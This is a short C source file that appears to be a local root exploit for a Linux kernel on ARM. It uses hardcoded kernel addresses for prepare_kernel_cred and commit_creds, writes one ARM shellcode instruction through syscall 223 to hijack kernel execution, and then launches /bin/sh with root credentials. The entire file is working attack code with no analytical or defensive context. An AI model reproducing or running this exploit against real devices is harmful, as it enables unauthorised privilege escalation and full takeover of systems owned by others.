#include <unistd.h>
#include <sys/syscall.h>

void get_root()
{
	char* (*prepare_kernel_cred)(int) = 0x8003f924;
	void (*commit_creds)(char *) = 0x8003f56c;
	(*commit_creds)((*prepare_kernel_cred)(0));
}

int main()
{
	char shellcode[] = "\x01\xf0\xa0\xe1"; // mov pc, r1
	syscall(223, shellcode, 0x7f000000);
	syscall(223, 0x7f000000, get_root);
	system("/bin/sh");
}
